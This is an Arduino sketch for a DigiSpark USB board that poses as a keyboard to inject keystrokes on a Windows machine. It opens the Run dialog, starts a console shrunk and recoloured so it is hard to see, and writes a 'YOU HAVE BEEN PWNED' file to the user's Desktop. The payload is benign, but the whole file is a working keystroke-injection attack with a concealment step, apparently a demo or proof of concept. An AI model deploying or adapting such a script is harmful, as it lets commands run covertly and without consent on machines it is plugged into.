//This DigiSpark script creates a text file on desktop with pwned message

#include "DigiKeyboard.h"

void setup()
{
  pinMode(1, OUTPUT); //LED on Model A
}

void loop()
{
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  //Obfuscate the terminal
  DigiKeyboard.delay(300);
  DigiKeyboard.print("cmd /k");
  DigiKeyboard.delay(300);
  DigiKeyboard.print("MODE CON: COLS=15 LINES=1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("COLOR EF");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // Start the commands
  DigiKeyboard.delay(300);
  DigiKeyboard.print("cd %UserProfile%/Desktop");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("echo YOU HAVE BEEN PWNED > YOU_HAVE_BEEN_PWNED.TXT");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH); //turn on led when program finishes
  for (;;)
  {
    /*Stops the digispark from running the script again*/
  }
}
